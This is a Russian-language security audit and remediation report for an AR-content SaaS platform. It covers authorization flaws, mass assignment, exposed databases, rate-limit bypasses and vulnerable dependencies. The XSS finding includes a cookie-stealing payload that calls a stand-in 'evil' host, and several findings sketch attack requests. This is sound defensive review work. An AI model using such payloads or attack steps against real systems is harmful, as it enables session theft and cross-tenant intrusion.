# V-Portal / ARV — Комплексный аудит безопасности (Full-Stack)

**Проект:** `C:\Project\ARV` — B2B SaaS платформа для создания AR-контента (FastAPI + SQLAlchemy async + PostgreSQL + Redis + Jinja2/htmx + Android ARCore).
**Тип аудита:** White-box review исходного кода, конфигураций и инфраструктуры.
**Дата:** 2026-09-14
**Методология:** ручное чтение кода (`app/`, `templates/`, `deploy/`, `docker-compose.yml`, `requirements.txt`), трассировка реальных потоков выполнения и фактических проверок авторизации, а не анализ имён файлов/классов. Код не изменялся.

> **Принцип проверки:** для каждой находки указан путь файла, строка и фактическое поведение в рантайме. Там, где проверка зависит от пути вызова (например, прямые вызовы API-функций из HTML-роутов), это отмечено явно.

---

## 0. Статус устранения (Remediation Status)

> Обновлено: 2026-09-14. Все находки **Critical / High / Medium** и все **Low** устранены в коде.
> Ниже — таблица «находка → статус → что именно изменено».

| ID | Severity | Статус | Что сделано |
|----|----------|--------|-------------|
| ARV-001 | Critical | ✅ Fixed | `app/html/utils.py`: добавлены `is_super_admin()`, `user_can_access_company()`, `require_super_admin()`, `require_company_scope()`. Все 11 админ-роутов настроек переведены на `require_super_admin`. |
| ARV-002 | Critical | ✅ Fixed | `app/html/routes/ar_content.py`: прямой вызов `delete_ar_content_by_id(...)` теперь передаёт `request`, `background_tasks`, `db`, `current_user`; добавлена проверка `require_company_scope`. |
| ARV-003 | Critical | ✅ Fixed | `app/api/deps_authz.py` переписан (fail-closed). Убран обход `company_id is None → allow` в 39 местах (6 файлов). `register_user` требует супер-админа + allow-list роли + `company_id`. Тесты обновлены. |
| ARV-004 | Critical | ✅ Fixed | Новый `app/utils/signed_urls.py` (HMAC-SHA256, TTL 30 дней). `/api/storage/yd-file` требует валидную подпись `exp`+`sig`; URL строятся через `build_yd_file_url()`. |
| ARV-005 | Critical | ✅ Fixed | `docker-compose.yml`: postgres/redis переведены с `ports` на `expose`, пароли обязательны (`${VAR:?...}`), Redis с `--requirepass`, healthcheck c `-a`. `Dockerfile`: healthcheck → `/api/health`. |
| ARV-006 | High | ✅ Fixed | `app/api/routes/videos.py`: allow-list `_LEGACY_VIDEO_UPDATABLE_FIELDS`, остальные поля отбрасываются. |
| ARV-007 | High | ✅ Fixed | `app/api/routes/rotation.py`: allow-list `_ROTATION_UPDATABLE_FIELDS`; `_sanitise_payload` отбрасывает `id`, `ar_content_id`, timestamps. |
| ARV-008 | High | ✅ Fixed | `app/middleware/rate_limiter.py`: подключён `SlowAPIMiddleware` (default_limits теперь применяются). `/login-form`, `/admin/login-form`, `/admin/login-2fa` получили явные лимиты. |
| ARV-009 | High | ✅ Fixed | `_get_real_ip` доверяет `X-Real-IP`/`X-Forwarded-For` только если peer — loopback/private (`_is_trusted_proxy`). |
| ARV-010 | High | ✅ Fixed | `app/main.py`: `allow_origin_regex` для localhost включается только вне продакшена. |
| ARV-011 | High | ✅ Fixed | HTML-роуты `companies`/`projects`/`ar_content` переведены на `require_super_admin` / `require_company_scope`. |
| ARV-012 | High | ✅ Fixed | `app/core/config.py`: `SESSION_SECRET_KEY`, `TOKEN_ENCRYPTION_KEY`, `MEDIA_URL_SECRET` (+ properties). `SessionMiddleware` и `token_encryption` используют отдельные секреты. |
| ARV-013 | High | ✅ Fixed | `templates/ar-content/detail.html`: `order_number` экранируется через `escapeHtml()` перед вставкой в `document.write`. |
| ARV-014 | High | ✅ Fixed | Публичные аналитические эндпоинты **нельзя** закрыть авторизацией (их вызывает публичный AR-viewer), поэтому защищены rate-limit (`120–240/minute`) и строгой валидацией (`_clean_str`, `_clean_duration`); клиентский `ip_address` больше не принимается. |
| ARV-015 | High | ✅ Fixed | `app/core/security.py`: legacy SHA-256 принимается только при `ALLOW_LEGACY_PASSWORD_HASHES=true` и **никогда** в продакшене; отказ логируется. |
| ARV-016 | High | ✅ Fixed | `requirements.txt`: `fastapi>=0.115`, `starlette>=0.40`, `python-multipart>=0.0.18`, `python-jose>=3.4.0`, `jinja2>=3.1.5`, `pillow>=11.3.0`; удалён дубль `opencv-python`. |
| ARV-017 | Medium | ✅ Fixed | `app/html/routes/__init__.py`: роутер `debug` регистрируется только вне продакшена. |
| ARV-018 | Medium | ✅ Fixed | `app/api/routes/health.py`: `/status` и `/metrics` требуют `require_super_admin`; `database_error` больше не возвращается. |
| ARV-019 | Medium | ✅ Fixed | `app/html/routes/auth.py`: `Referer` принимается только если начинается с `/` и не `//`. |
| ARV-020 | Medium | ✅ Fixed | Новый `deploy/nginx/security-headers.conf` (HSTS, CSP, Referrer-Policy, Permissions-Policy, X-Frame-Options, nosniff) + `server_tokens off`. Сниппет включается в каждый location (иначе Nginx затирает унаследованные заголовки). |
| ARV-021 | Medium | ✅ Fixed | `deploy/nginx/arv.conf`: убран `Access-Control-Allow-Origin "*"` у `/storage/`. |
| ARV-022 | Medium | ✅ Fixed | `.env.production` убран из индекса (`git rm --cached`) и добавлен в `.gitignore`; создан безопасный шаблон `.env.production.example`. |
| ARV-023 | Medium | ✅ Fixed | `app/api/routes/alerts_ws.py`: токен берётся из HttpOnly-cookie `access_token` (query-параметр — только legacy), добавлены проверка `Origin` и проверка отзыва токена/пользователя. |
| ARV-024 | Medium | ✅ Fixed | `app/html/routes/auth.py`: 2FA-код сравнивается через `secrets.compare_digest`, добавлен счётчик попыток (макс. 5). |
| ARV-025 | Low | ✅ Fixed | `requirements.txt`: `opencv-python` удалён (оставлен только `-headless`). |
| ARV-026 | Low | ✅ Fixed | `app/main.py`: тело запроса не логируется и не возвращается в продакшене. |
| ARV-027 | Low | ✅ Fixed | Устаревший `X-XSS-Protection` убран; добавлен `server_tokens off`. |
| ARV-028 | Low | ✅ Fixed | `app/api/routes/auth.py`: политика `SameSite` вынесена в `COOKIE_SAMESITE` (default `lax`, можно ужесточить до `strict`). |
| ARV-029 | Low | ✅ Fixed | Новый `app/utils/pii.py` (`mask_email`, `mask_token`); e-mail маскируются в логах `auth` (API и HTML). |

**Регрессионные тесты:** `tests/test_security_fixes.py` фиксирует новое безопасное поведение (подписи медиа, legacy-хеши, валидация аналитики, WS-origin, allow-list, fail-closed скоупинг).

**Остаточный риск:** для полного закрытия ARV-020 рекомендуется постепенно отказаться от `'unsafe-inline'`/`'unsafe-eval'` в CSP (требует перевода inline-скриптов на nonce/hash). `numpy>=1.26,<2.0` в `requirements.txt` не устанавливается на Python 3.13+ (в CI используется 3.11) — при переходе на 3.13 потребуется обновление NumPy/OpenCV.

---

## 1. Executive Summary

Платформа имеет **хорошо продуманный нижний слой безопасности** (адаптивное хеширование паролей, Redis-чёрный список JWT, CSRF double-submit, multi-tenant `company_id`, lockout, Fernet-шифрование OAuth-токенов, non-root Docker-пользователь, TLS 1.2/1.3 + HSTS + X-Frame-Options).

Однако **слой контроля доступа (authorization) сломан системно**. Корневая причина — HTML-панель администратора использует зависимость `get_current_user_optional` и хелпер `require_active_user()`, который проверяет **только факт аутентификации**, но не роль и не `company_id`. В результате:

- любой аутентифицированный пользователь (включая роль `user`) может менять **глобальные настройки безопасности** платформы;
- часть HTML-роутов напрямую вызывает API-функции, у которых зависимость `Depends(require_company_access)` **не резолвится** при прямом вызове, из-за чего проверка владения арендатором пропускается (удаление чужого AR-контента);
- модель «`company_id IS NULL` = супер-админ» + регистрация без `company_id` создаёт обход изоляции арендаторов.

**Итоговая оценка (первичный аудит): SECURITY GATE — FAIL.** Обнаружено **7 Critical**, **10 High**, **8 Medium**, **5 Low**. Платформа не готова к продакшену до устранения как минимум всех Critical/High.

> **Обновление 2026-09-14:** все находки устранены в коде. Актуальный статус — раздел 0 «Статус устранения»; гейт переведён в **CONDITIONAL PASS**.

---

## 2. Attack Surface (поверхность атаки)

| Класс | Точки входа |
|---|---|
| Публичные (без аутентификации) | `GET /api/health`, `GET /api/health/status`, `GET /api/health/metrics`, `GET /api/storage/yd-file`, `GET /api/public/ar/{unique_id}/content`, все `GET /api/viewer/*`, `POST /api/analytics/ar-session`, `POST /api/analytics/mobile/sessions`, `POST /api/analytics/ar-diagnostic`, `POST /api/analytics/mobile/analytics`, `GET /view/{unique_id}`, `GET /storage/*` (Nginx), `WS /api/ws/alerts?token=...` |
| Аутентификация | `POST /api/auth/login` (10/min), `POST /api/auth/login-form` (без лимита), `POST /admin/login-form` (без лимита), `GET /admin/login` (5/min), `POST /admin/login-2fa` (без лимита), `POST /api/auth/register` (роль admin) |
| HTML-админка | `/admin`, `/companies*`, `/projects*`, `/ar-content*`, `/settings*`, `/logs`, `/notifications*`, `/analytics`, `/backups` |
| API (аутентификация) | `/api/companies*`, `/api/projects*`, `/api/videos*`, `/api/rotation*`, `/api/ai*`, `/api/notifications*`, `/api/backups*`, `/api/oauth*` |
| Инфраструктура | PostgreSQL `5432`, Redis `6379`, app `8000` (docker-compose) |

---

## 3. CRITICAL

### ARV-001 — Broken Function-Level Authorization: любой пользователь меняет глобальные настройки
- **SEVERITY:** Critical
- **CATEGORY:** Authorization / Broken Access Control (OWASP A01)
- **FILE / LINE:** `app/html/utils.py:11-15`; `app/html/routes/settings.py:113-450`
- **COMPONENT:** HTML admin panel (Settings)
- **VULNERABILITY:** `require_active_user()` проверяет только `current_user` и `is_active`, без проверки `is_super_admin` / `role`. Все POST-эндпоинты настроек (`/settings/security`, `/settings/notifications`, `/settings/general`, `/settings/backup`, `/settings/storage`, `/settings/ar`) используют `Depends(get_current_user_optional)` + `require_active_user`.
- **EVIDENCE:**
  ```python
  # app/html/utils.py
  def require_active_user(current_user):
      if not current_user or not getattr(current_user, "is_active", False):
          return login_redirect()
      return None          # <-- нет проверки роли/супер-админа
  ```
  ```python
  # app/html/routes/settings.py:165-177
  @router.post("/settings/security")
  async def update_security_settings(request, current_user=Depends(get_current_user_optional), db=..., 
      password_min_length: int = Form(...), session_timeout: int = Form(...),
      require_2fa: str = Form("off"), telegram_2fa_chat_id: str = Form(""),
      max_login_attempts: int = Form(5), lockout_duration: int = Form(300), api_rate_limit: int = Form(100)):
      redirect = require_active_user(current_user)   # только аутентификация
      ...
      await settings_service.update_security_settings(SecuritySettings(...))
  ```
- **ATTACK SCENARIO:** Пользователь с ролью `user` (например, редактор компании-клиента) логинится, получает cookie `access_token`, отправляет `POST /settings/security` с `require_2fa=off&api_rate_limit=100000&max_login_attempts=999999&lockout_duration=1`. Платформа отключает 2FA и лимиты для **всех** арендаторов. Аналогично через `/settings/notifications` перезаписываются SMTP-пароль и Telegram-токен.
- **IMPACT:** Полная компрометация глобальной конфигурации безопасности мульти-тенантной платформы; отключение защитных механизмов; перенаправление уведомлений.
- **LIKELIHOOD:** High (любая аутентифицированная учётная запись).
- **RECOMMENDED FIX:** Ввести зависимость `require_super_admin` и применить её ко всем `/settings/*`, `/logs`, `/backups`, управлению пользователями. `require_active_user` не должна использоваться как единственная защита для привилегированных операций.
- **TEST TO ADD:** `test_settings_security_requires_super_admin`: обычный пользователь → `POST /settings/security` → ожидать 403; конфиг не изменён.

### ARV-002 — Bypass проверки владения при удалении AR-контента через HTML-роут
- **SEVERITY:** Critical
- **CATEGORY:** Authorization / IDOR-BOLA
- **FILE / LINE:** `app/html/routes/ar_content.py:532-557`; `app/api/routes/ar_content.py:1475-1488`
- **COMPONENT:** AR content deletion
- **VULNERABILITY:** HTML-роут вызывает API-функцию напрямую и **не передаёт `current_user`**:
  ```python
  # app/html/routes/ar_content.py:550
  await delete_ar_content_by_id(content_id=int(ar_content_id), background_tasks=background_tasks, db=db)
  ```
  Так как `current_user: User = Depends(get_current_active_user)` не передан, он принимает значение по умолчанию — объект `Depends`. Далее проверка владения:
  ```python
  # app/api/routes/ar_content.py:1486
  if not getattr(current_user, 'is_super_admin', False) and getattr(current_user, 'company_id', None) is not None:
      if ar_content.company_id != getattr(current_user, 'company_id', None):
          raise HTTPException(403, "Access denied to this AR content")
  ```
  У объекта `Depends` нет атрибута `company_id` → `getattr(...) is None` → `None is not None` = `False` → **всё условие ложно → проверка владения полностью пропускается.**
- **EVIDENCE:** см. код выше; HTML-роут требует лишь `if not current_user: 401` (любой валидный пользователь).
- **ATTACK SCENARIO:** Аутентифицированный пользователь арендатора A перебирает `DELETE /ar-content/{id}` и удаляет AR-контент арендатора B (включая связанные видео и файлы).
- **IMPACT:** Cross-tenant destructive action (удаление данных чужих арендаторов), нарушение целостности и доступности.
- **LIKELIHOOD:** High.
- **RECOMMENDED FIX:** Передавать `current_user=current_user` при прямом вызове API-функций; в идеале — не вызывать API-функции напрямую из HTML-роутов, а выносить бизнес-логику в сервисный слой с обязательным `current_user`. Дополнительно: если `current_user` не является `User` — отклонять (fail-closed).
- **TEST TO ADD:** `test_html_delete_ar_content_other_company_403`: пользователь компании A, `DELETE /ar-content/{id_компании_B}` → 403, запись существует.

### ARV-003 — `company_id IS NULL` трактуется как супер-админ + регистрация без `company_id`
- **SEVERITY:** Critical
- **CATEGORY:** Authorization / Tenant isolation bypass
- **FILE / LINE:** `app/api/deps_authz.py:12-16, 19-35, 38-57, 60-72`; `app/api/routes/auth.py:358-419`
- **COMPONENT:** Authorization core + Registration
- **VULNERABILITY:** Во всех проверках доступа пользователь с `company_id is None` получает доступ ко **всем** компаниям:
  ```python
  # app/api/deps_authz.py:14
  if getattr(user, 'is_super_admin', False) or getattr(user, 'company_id', None) is None:
      return None  # super admin has access to all
  ```
  При этом `register_user` создаёт пользователя **без `company_id`**:
  ```python
  # app/api/routes/auth.py:396-402
  new_user = User(email=..., hashed_password=..., full_name=..., role=user_data.role, is_active=True)
  # company_id НЕ установлен → NULL
  ```
  Проверка регистрации — только `current_user.role != "admin"` (`auth.py:367`), при этом `RegisterRequest.role` — свободная строка со значением по умолчанию `"admin"`.
- **EVIDENCE:** `deps_authz.py` (4 места) + `auth.py:367,396-402` + `schemas/auth.py:46`.
- **ATTACK SCENARIO:** Администратор компании-клиента (роль `admin`, `is_super_admin=False`) вызывает `POST /api/auth/register` и создаёт пользователя (без `company_id`). Этот новый пользователь теперь проходит `require_company_access` / `require_resource_access` для **любой** компании, т.е. получает кросс-арендаторский доступ ко всем компаниям, проектам, AR-контенту и видео.
- **IMPACT:** Полный обход multi-tenant изоляции; горизонтальная и вертикальная эскалация привилегий.
- **LIKELIHOOD:** High.
- **RECOMMENDED FIX:** (1) Никогда не трактовать `company_id IS NULL` как «доступ ко всему»; ввести явный флаг `is_super_admin`. (2) В `register_user` требовать `is_super_admin` и явный `company_id`, валидировать `role` по allow-list (`admin|editor|user`) и запрещать создание пользователей без компании. (3) Добавить проверку в модель/миграцию: `company_id NOT NULL` для не-супер-админов.
- **TEST TO ADD:** `test_register_requires_super_admin_and_company`; `test_user_without_company_cannot_access_other_company`.

### ARV-004 — Неаутентифицированный прокси файлов Yandex Disk
- **SEVERITY:** Critical
- **CATEGORY:** Authorization / Broken Access Control
- **FILE / LINE:** `app/api/routes/storage.py:231-326`
- **COMPONENT:** `GET /api/storage/yd-file`
- **VULNERABILITY:** Эндпоинт не имеет зависимости аутентификации; принимает `path` и `company_id` из query и стримит файл из Yandex Disk:
  ```python
  @router.get("/yd-file")
  async def proxy_yandex_disk_file(request, path: str = Query(...), company_id: int = Query(...), db=Depends(get_db)):
      company = await db.get(Company, company_id)
      ...
      download_url = await provider.get_download_url(path)
      ... StreamingResponse(...)
  ```
  В `app/middleware/csrf.py:41-45` путь явно исключён из CSRF, а аутентификации нет вовсе.
- **EVIDENCE:** отсутствует `Depends(get_current_active_user)`; отсутствует проверка `company_id` относительно пользователя.
- **ATTACK SCENARIO:** Злоумышленник перебирает `company_id` и пути, скачивая любые файлы (фото, видео, маркеры) любого арендатора без логина.
- **IMPACT:** Массовая утечка приватных медиа-данных всех арендаторов.
- **LIKELIHOOD:** High.
- **RECOMMENDED FIX:** Требовать аутентификацию и проверять доступ к `company_id` (`require_company_access`), либо подписывать URL (HMAC + TTL) для публичных превью. Никогда не доверять `company_id` из query без проверки.
- **TEST TO ADD:** `test_yd_file_requires_auth_and_company_scope`: аноним → 401; пользователь A c `company_id=B` → 403.

### ARV-005 — Docker Compose публикует PostgreSQL и Redis наружу, Redis без пароля
- **SEVERITY:** Critical (при развёртывании на сервере с публичным интерфейсом)
- **CATEGORY:** Infrastructure / Misconfiguration
- **FILE / LINE:** `docker-compose.yml:14, 18-19, 28-36, 55-56`
- **COMPONENT:** docker-compose
- **VULNERABILITY:**
  ```yaml
  postgres:
    environment:
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-change-me-to-a-strong-random-password}  # дефолт-пароль
    ports: ["5432:5432"]        # публикация на хост
  redis:
    command: redis-server --maxmemory 128mb ...   # без requirepass
    ports: ["6379:6379"]        # публикация на хост
  app:
    ports: ["8000:8000"]
  ```
- **EVIDENCE:** см. выше. Пароль по умолчанию используется и в строке подключения (`:58`).
- **ATTACK SCENARIO:** При развёртывании на VPS порты 5432/6379 доступны из интернета; Redis без аутентификации позволяет читать/писать ключи (в т.ч. чёрный список JWT и `user_revoked`), БД — при дефолтном пароле получить полный доступ к данным.
- **IMPACT:** Полная компрометация данных и состояния сессий; обход механизмов отзыва токенов.
- **LIKELIHOOD:** High при использовании данного compose в проде.
- **RECOMMENDED FIX:** Убрать `ports` для postgres/redis (оставить только `expose` внутри `vertex_net`), задать `requirepass` для Redis, обязательный `POSTGRES_PASSWORD` без дефолта (fail-fast).
- **TEST TO ADD:** CI-проверка манифеста: отсутствие публикации 5432/6379; наличие `requirepass`.

### ARV-006 — Mass Assignment в `PUT /api/videos/videos/{video_id}`
- **SEVERITY:** Critical
- **CATEGORY:** API Security / Mass Assignment
- **FILE / LINE:** `app/api/routes/videos.py:1080-1106`
- **COMPONENT:** Video update
- **VULNERABILITY:** Принимается сырой `payload: dict`, и через `setattr` устанавливается **любое** существующее поле ORM-объекта:
  ```python
  for k, val in payload.items():
      if hasattr(v, k):
          setattr(v, k, val)     # можно задать ar_content_id, is_active, subscription_end, ...
  await db.commit()
  ```
- **EVIDENCE:** см. выше; проверка доступа использует `v.ar_content_id` до мутации, но не ограничивает набор полей.
- **ATTACK SCENARIO:** Пользователь отправляет `{"ar_content_id": <чужой_id>, "subscription_end": "2099-01-01", "is_active": true}` — перепривязывает видео к чужому AR-контенту, продлевает подписку, меняет активность.
- **IMPACT:** Нарушение целостности данных, обход бизнес-логики подписок, кросс-арендаторская модификация.
- **LIKELIHOOD:** High.
- **RECOMMENDED FIX:** Заменить на Pydantic-схему с явным allow-list полей; запретить изменение `id`, `ar_content_id`, `created_at`. Удалить «legacy» endpoint или ограничить его.
- **TEST TO ADD:** `test_update_video_rejects_unknown_and_system_fields`.

### ARV-007 — Mass Assignment в обновлении расписания ротации
- **SEVERITY:** Critical
- **CATEGORY:** API Security / Mass Assignment
- **FILE / LINE:** `app/api/routes/rotation.py:120-143`
- **COMPONENT:** `PUT /api/rotation/{schedule_id}`
- **VULNERABILITY:** `payload: dict[str, Any]` → `_sanitise_payload` удаляет только `id`, затем:
  ```python
  for k, v in clean.items():
      if hasattr(sched, k):
          setattr(sched, k, v)   # ar_content_id, is_active, video_sequence, current_index, ...
  ```
- **EVIDENCE:** см. выше.
- **ATTACK SCENARIO:** Перепривязка расписания к чужому `ar_content_id`, включение/выключение ротации, подмена `video_sequence`.
- **IMPACT:** Целостность данных, кросс-арендаторская модификация, влияние на выдачу контента в AR-вьювере.
- **LIKELIHOOD:** Medium-High.
- **RECOMMENDED FIX:** Pydantic-схема с allow-list; запрет системных полей.
- **TEST TO ADD:** `test_update_rotation_rejects_system_fields`.

---

## 4. HIGH

### ARV-008 — Глобальный rate limit не применяется (нет SlowAPIMiddleware); 2FA-брутфорс
- **SEVERITY:** High
- **CATEGORY:** API Security / Anti-automation
- **FILE / LINE:** `app/main.py:340`; `app/middleware/rate_limiter.py:70-113`; `app/api/routes/auth.py:128, 232`; `app/html/routes/auth.py:66, 104, 231`
- **COMPONENT:** Rate limiting
- **VULNERABILITY:** `setup_rate_limiting()` регистрирует `app.state.limiter` и обработчик `RateLimitExceeded`, но **не добавляет `SlowAPIMiddleware`**. В slowapi `default_limits` применяются только через middleware — значит дефолтный лимит (`_dynamic_limit()` → `100/minute`) **не действует**. Ограничены только явно декорированные роуты: `POST /api/auth/login` (10/min) и `GET /admin/login` (5/min).
  Без лимита остаются: `POST /api/auth/login-form`, `POST /admin/login-form`, `POST /admin/login-2fa`, и практически все остальные API/HTML эндпоинты.
  В `login_2fa_verify` (`app/html/routes/auth.py:259`) код сравнивается `!=` (не constant-time) и **нет счётчика попыток**: 6-значный код (1e6) с TTL 300 c.
- **EVIDENCE:** `grep` по `SlowAPIMiddleware` → 0 совпадений; `rate_limiter.py:100-113` добавляет только обработчик исключения.
- **ATTACK SCENARIO:** Credential stuffing по `POST /admin/login-form` без троттлинга (ограничен только lockout 5 попыток на аккаунт, что позволяет перебор по списку пользователей); брутфорс 2FA-кода при известном пароле.
- **IMPACT:** Подбор учётных данных, обход второго фактора, автоматизированные атаки.
- **LIKELIHOOD:** High.
- **RECOMMENDED FIX:** Добавить `app.add_middleware(SlowAPIMiddleware)`; навесить явные лимиты на login/2FA/register; добавить счётчик попыток 2FA и `secrets.compare_digest`.
- **TEST TO ADD:** `test_login_form_rate_limited`; `test_2fa_attempts_limited`.

### ARV-009 — Ключ rate limit доверяет клиентским заголовкам `X-Real-IP` / `X-Forwarded-For`
- **SEVERITY:** High
- **CATEGORY:** API Security / Rate-limit bypass
- **FILE / LINE:** `app/middleware/rate_limiter.py:56-67`
- **VULNERABILITY:** `_get_real_ip` возвращает `X-Real-IP` или первый `X-Forwarded-For` без проверки доверенного прокси. При прямом доступе к `:8000` (порт опубликован, `docker-compose.yml:56`) злоумышленник подставляет произвольный IP в каждом запросе → лимит обходится.
- **EVIDENCE:** см. выше.
- **ATTACK SCENARIO:** Ротация `X-Real-IP` при брутфорсе логина.
- **IMPACT:** Обход rate limiting (усугубляет ARV-008).
- **LIKELIHOOD:** High.
- **RECOMMENDED FIX:** Использовать доверенный прокси (`--proxy-headers`/`ForwardedHeadersMiddleware` с белым списком), не публиковать `:8000`, либо игнорировать заголовки, если peer не доверенный.
- **TEST TO ADD:** `test_rate_limit_key_ignores_spoofed_headers_when_direct`.

### ARV-010 — CORS `allow_credentials=True` + regex на любой localhost
- **SEVERITY:** High
- **CATEGORY:** CSRF/CORS Misconfiguration
- **FILE / LINE:** `app/main.py:221-228`
- **VULNERABILITY:**
  ```python
  allow_origin_regex=r"https?://(localhost|127\.0\.0\.1)(:\d+)?",
  allow_credentials=True,
  ```
  Любая страница, отданная с `localhost`/`127.0.0.1` (в т.ч. через DNS-rebinding или локально запущенный сервис), считается доверенным origin и может читать ответы аутентифицированных запросов с cookie.
- **EVIDENCE:** см. выше; `.env.production:19` дополнительно добавляет `http://localhost:8000` в прод-CORS.
- **ATTACK SCENARIO:** Злоумышленник убеждает жертву открыть локальный сервер (или использует DNS rebinding), который через `fetch(..., credentials:'include')` читает `/api/...` и эксфильтрует данные.
- **IMPACT:** Утечка аутентифицированных данных, обход CSRF-модели.
- **LIKELIHOOD:** Medium.
- **RECOMMENDED FIX:** Убрать `allow_origin_regex` в проде, оставить строгий allow-list доменов; не включать `allow_credentials=True` с широкими origin.
- **TEST TO ADD:** `test_cors_rejects_localhost_origin_in_production`.

### ARV-011 — HTML-роуты компаний/проектов без проверки арендатора
- **SEVERITY:** High
- **CATEGORY:** Authorization / IDOR
- **FILE / LINE:** `app/html/routes/companies.py:186-222, 224-295, 359-426`; `app/html/routes/projects.py:326-408`
- **VULNERABILITY:** HTML-роуты используют `get_current_user_optional` + `require_active_user` (только аутентификация). `/companies/{id}/edit` загружает любую компанию без проверки доступа; `project_create_post` принимает произвольный `company_id` из формы и создаёт проект в чужой компании.
- **EVIDENCE:** `companies.py:200` (`db.get(Company, int(company_id))` без проверки); `projects.py:372-382` (`company = await db.get(Company, int(company_id))` → создание проекта).
- **ATTACK SCENARIO:** Пользователь арендатора A открывает `/companies/{id_B}/edit` (просмотр данных) и `POST /projects` с `company_id=B` (создание проекта у конкурента).
- **IMPACT:** Кросс-арендаторское чтение/создание.
- **LIKELIHOOD:** High.
- **RECOMMENDED FIX:** Проверять `is_super_admin`/`company_id` во всех HTML-роутах; вынести проверку в общий dependency.
- **TEST TO ADD:** `test_html_company_edit_other_company_403`; `test_project_create_cross_company_denied`.

### ARV-012 — Переиспользование `SECRET_KEY` для JWT, сессий и шифрования токенов
- **SEVERITY:** High
- **CATEGORY:** Cryptographic Key Management
- **FILE / LINE:** `app/utils/token_encryption.py:24-41`; `app/main.py:236-241`; `app/core/security.py:70`
- **VULNERABILITY:** Fernet-ключ выводится из `SECRET_KEY` через PBKDF2, при этом соль выводится из того же `SECRET_KEY` (`sha256(SECRET_KEY)[:16]`) — соль детерминирована и коррелирована с ключом, что снижает стойкость KDF. Тот же `SECRET_KEY` подписывает JWT и `SessionMiddleware`.
- **EVIDENCE:** `token_encryption.py:31,41`; `main.py:238` (`secret_key=settings.SECRET_KEY`); `security.py:70`.
- **ATTACK SCENARIO:** Утечка `SECRET_KEY` компрометирует одновременно подпись JWT, cookie-сессии и шифрование OAuth-токенов Yandex.
- **IMPACT:** Мультипликативная компрометация всех секретов; подделка JWT и расшифровка токенов.
- **LIKELIHOOD:** Medium.
- **RECOMMENDED FIX:** Раздельные ключи: `JWT_SECRET`, `SESSION_SECRET`, `TOKEN_ENCRYPTION_KEY` (отдельный статический Fernet-ключ, не выводимый из пароля). Соль — случайная, хранимая рядом с ключом.
- **TEST TO ADD:** проверка ротации ключей без потери доступа; тест, что смена одного ключа не влияет на другой домен.

### ARV-013 — Stored XSS через `order_number` в печати QR/PDF
- **SEVERITY:** High
- **CATEGORY:** XSS (DOM)
- **FILE / LINE:** `templates/ar-content/detail.html:819-841` (особенно строка `825`)
- **VULNERABILITY:** В `downloadQRAsPDF` значение `this.arContent.order_number` подставляется в HTML без экранирования и пишется через `document.write`:
  ```js
  printWindow.document.write(`... <title>QR Code - ${this.arContent.order_number}</title> ...`);
  ```
  Рядом `printableQr.dataUrl` экранируется через `this.escapeHtml`, а `order_number` — нет.
- **EVIDENCE:** см. выше.
- **ATTACK SCENARIO:** Пользователь задаёт `order_number = </title><img src=x onerror=fetch('https://evil/'+document.cookie)>`, затем (сам или другой пользователь арендатора) нажимает «Скачать PDF» → выполнение скрипта в контексте домена.
- **IMPACT:** Кража сессионных данных, действия от имени пользователя (в т.ч. админа).
- **LIKELIHOOD:** Medium.
- **RECOMMENDED FIX:** Экранировать `order_number` (использовать `escapeHtml` и для него), применять CSP, избегать `document.write` с интерполяцией данных.
- **TEST TO ADD:** шаблонный тест на экранирование `order_number` в JS-строке.

### ARV-014 — Неаутентифицированные аналитические эндпоинты (инъекция данных/фальсификация)
- **SEVERITY:** High
- **CATEGORY:** API Security / Broken Access Control
- **FILE / LINE:** `app/api/routes/analytics.py` — `POST /ar-session`, `POST /mobile/sessions`, `POST /ar-diagnostic`, `POST /mobile/analytics`
- **VULNERABILITY:** Эндпоинты не имеют зависимости аутентификации, создают/обновляют `ARViewSession` и логи диагностики по произвольным данным.
- **EVIDENCE:** отсутствуют `Depends(get_current_active_user)`; при этом аутентифицированные агрегаты (`overview/company/project/content`) фильтруют по `company_id`.
- **ATTACK SCENARIO:** Массовая накачка фейковых сессий/просмотров, отравление аналитики, раздувание хранилища; при отсутствии валидации — потенциальная запись произвольных значений.
- **IMPACT:** Искажение бизнес-метрик, DoS хранилища, загрязнение диагностических логов.
- **LIKELIHOOD:** High.
- **RECOMMENDED FIX:** Аутентификация (device/app key) + строгая Pydantic-валидация + rate limit; подписывать события или ограничить приём доверенными источниками.
- **TEST TO ADD:** `test_analytics_requires_auth_or_signature`.

### ARV-015 — Legacy-хеши паролей: неподсоленный SHA-256
- **SEVERITY:** High
- **CATEGORY:** Authentication / Password storage
- **FILE / LINE:** `app/core/security.py:19-33`
- **VULNERABILITY:** Поддерживается верификация legacy-хешей `sha256(password)` без соли (миграция «на лету» при логине). При утечке БД такие хеши подбираются радужными таблицами/GPU мгновенно.
- **EVIDENCE:** `_legacy_sha256` + `is_legacy_password_hash` + `verify_password`.
- **ATTACK SCENARIO:** Дамп БД → массовый подбор паролей пользователей, ещё не совершивших вход после миграции.
- **IMPACT:** Компрометация учётных данных.
- **LIKELIHOOD:** Medium.
- **RECOMMENDED FIX:** Принудительная миграция: при первом входе — rehash (уже есть), плюс фоновая инвалидация legacy-хешей и обязательная смена пароля; запретить приём новых legacy-хешей.
- **TEST TO ADD:** `test_legacy_hash_flagged_for_migration_and_rehashed`.

### ARV-016 — Уязвимые версии зависимостей
- **SEVERITY:** High
- **CATEGORY:** Vulnerable Components (OWASP A06)
- **FILE / LINE:** `requirements.txt:18, 21, 61, 2-3`
- **VULNERABILITY:** Известные уязвимости в зафиксированных версиях:
  - `python-multipart==0.0.6` — CVE-2024-24762 (ReDoS), CVE-2024-53981 (DoS malformed multipart, испр. 0.0.18).
  - `python-jose[cryptography]==3.3.0` — CVE-2024-33663 (algorithm confusion), CVE-2024-33664 (JWT bomb DoS).
  - `jinja2==3.1.3` — CVE-2024-34064 (XSS `xmlattr`), CVE-2024-56201, CVE-2024-56326 (sandbox escape).
  - `fastapi==0.109.0` / транзитивный `starlette 0.35.x` — CVE-2024-47874 (DoS multipart).
- **EVIDENCE:** версии из `requirements.txt`.
- **ATTACK SCENARIO:** DoS через malformed multipart на любом upload-эндпоинте; эксплуатация algorithm confusion при слабой конфигурации проверки JWT.
- **IMPACT:** DoS, потенциальная подделка токенов, XSS.
- **LIKELIHOOD:** Medium-High.
- **RECOMMENDED FIX:** Обновить: `python-multipart>=0.0.18`, `python-jose>=3.4.0` (или перейти на `PyJWT`), `jinja2>=3.1.5`, `fastapi>=0.115`/`starlette>=0.40`. Добавить `pip-audit`/Dependabot в CI.
